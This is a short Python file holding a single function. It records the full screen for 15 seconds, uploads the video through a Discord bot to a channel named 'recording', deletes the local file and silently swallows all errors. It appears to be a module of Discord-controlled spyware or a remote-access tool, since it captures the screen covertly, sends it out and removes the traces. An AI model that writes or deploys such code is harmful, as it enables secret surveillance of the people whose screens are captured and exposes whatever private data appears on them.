import cv2
import numpy as np
import pyautogui
import time
import os
import asyncio
import discord

async def record_and_send_screen(bot):
    try:
        guild = discord.utils.get(bot.guilds)
        channel = discord.utils.get(guild.text_channels, name="recording")

        if not channel:
            return

        
        screen_size = (1920, 1080)
        fps = 30
        duration = 15
        filename = "screen_capture.mp4"
        fourcc = cv2.VideoWriter_fourcc(*"mp4v")
        out = cv2.VideoWriter(filename, fourcc, fps, screen_size)

        start_time = time.time()

        while time.time() - start_time < duration:
            img = pyautogui.screenshot(region=(0, 0, 1920, 1080))
            frame = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
            out.write(frame)
            time.sleep(1 / fps)

        out.release()

        await channel.send(file=discord.File(filename))
        os.remove(filename)

    except Exception as e:
        pass
